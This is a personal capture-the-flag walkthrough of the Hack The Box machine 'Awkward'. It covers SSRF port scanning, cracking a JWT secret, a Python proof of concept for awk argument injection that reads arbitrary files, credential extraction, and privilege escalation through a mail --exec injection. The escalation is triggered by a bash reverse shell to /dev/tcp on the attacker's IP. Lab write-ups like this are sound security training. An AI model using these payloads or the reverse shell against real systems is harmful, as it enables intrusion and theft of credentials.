IP: 10.10.11.185
# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/awkward 10.10.11.185
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80
Redirect to `hat-valley.htb`

Username: Bean Hill, Christine Wool, Christopher Jones, Jackson Lightheart

Site talks about a new store.

Looking at the headers to try to figure out the backend.
`X-Powered-By: Express` which means nodejs.

Looking at the debugger in firefox we can find the router.js file which has the following sites. `hr, api`
## Ffuf
subdomains.
```bash
ffuf -u http://10.10.11.185 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.hat-valley.htb" -mc all -fs 132
```
Find `store.hat-valley.htb`

This is a login page.

index.php causes the pop up.

## API page
Also contains the following pages.
```txt
login
all-leave
submit-leave
staff-details
store-status
```

All-leave and staff-details give a jwt error
```
GET /api/staff-details HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=guest
Upgrade-Insecure-Requests: 1
```
Removing the cookie causes a list of all valid users and passwords.

jq magic
```bash
cat staffdetails.json | jq -r '.[] | "\(.username):\(.password)"' > creds.out
```

each hash has length of 65, which means sha256

Checking crackstation one cracks to chris123.
```
e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
```

# HR page as chris
Logging in there is a call to the store domain. Which has a SSRF.

Can use ffuf again to do a portscan on localhost.
```bash
ffuf -u http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22 -w <( seq 1 65535) -mc all -fs 0
```

the <( treat the loop as a file, %22 is "

We get back 80, 3002, 8080

# 3002
This is the API documentation.
```http
http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:3002%22
```

bad characters.
```js
const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
```

Two possible command injection places. First one is:
```js
exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {
```

where finalEntry is the username of a JWT that has been passed over the bad characters.

```js
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
```

Same conditions.

The way the awk command is running is:
```bash
awk '/ <user> /'
```

So what if the user is:
```bash
/' /etc/passwd/ '/
```

This would cause awk to open it like a file.
```bash
awk '//' /etc/passwd '//'
```

# File disclosure (LFI but different)
## JWT
Chris' jwt token:
```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc3NDEzMzU3fQ.hK9xHLgnXOmt4kefMQLaV5nmnbwpiaNWPJ5A1LLz4zA
```

Hashcat to crack the jwt.
```txt
123beany123
```

:)

## Python script
Automation time.

POC:
```python
import requests
import jwt
import sys

secret = '123beany123'
username = f"/' {sys.argv[1]} '/"
token = jwt.encode({'username': username,  "iat": 1516239022}, secret, algorithm="HS256")

headers = {'Cookie': 'token=' +token}
r = requests.get('http://hat-valley.htb/api/all-leave',headers=headers)

print(r.text)
```

## Code exec
```bash
python3 exp.py /var/www/hat-valley.htb/package.json|jq .
```

This leaks the file location of the server: `server/server.js`

Found a sqldb pwd.
`SQLDatabasePassword321!`

Get the conf file for the store page to get the htpasswd file.
```bash
python3 exp.py /etc/nginx/sites-available/store.conf
python3 exp.py /etc/nginx/conf.d/.htpasswd

admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```
(hash didn't crack)

Checking what users are on the box:
```
root
bean
christine
```

Check if we can grab there .bashrc files.

unique file:
```bash
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Grabbing the tar.gz file.

This wont open due to the exp.py not handling files. 
```python
with open("backup.tar.gz",'wb') as f:
	f.write(r.content)
```

Instead of `print(r.text)`

Extracting everything and looking in the `.config/xpad/content-DS1ZS1` file there are creds:

```txt
bean.hill:014mrbeanrules!#P
```

Trying this for the bean user (not bean.hill cause /etc/passwd) gets us logged in. :)

user.txt:
```txt
c52782248181133a80ff29717dbed19a
```

Trying this password for the htpasswd file works as well.

# Foothold
Checking what happens if you request a leave on the hr site.

It sends the username to mail, which has a gtfo shell
# Priv esc

```
" --exec='!/dev/shm/script.sh'
```

Changing jwt to include the payload, and sending it through gives `bad characters detected` :( The bad char is the `!`

Instead lets try to write to the file.

We can make a sim link.
```bash
ln -s /var/www/private/leave_requests.csv test
```

We could also try to create a malicious item, which would bypass the bad chars.
```bash
bean@awkward:/var/www/store/product-details$ cat 4.txt 
***Hat Valley Product***
" --exec='!/dev/shm/script.sh' "
```

Create the rev shell
```bash
bash -i >& /dev/tcp/10.10.14.2/9001 0>&1

```

Then send the request in burp suite:
```http
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 32
Origin: http://store.hat-valley.htb
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close
Referer: http://store.hat-valley.htb/shop.php

item=4&user=test&action=add_item
```

Which gives a shell. :)

root.txt

(I forgot to grab the flag so I had to do everything again. :|

```
10fd9d46166ed8990bf51d6de19f461d
```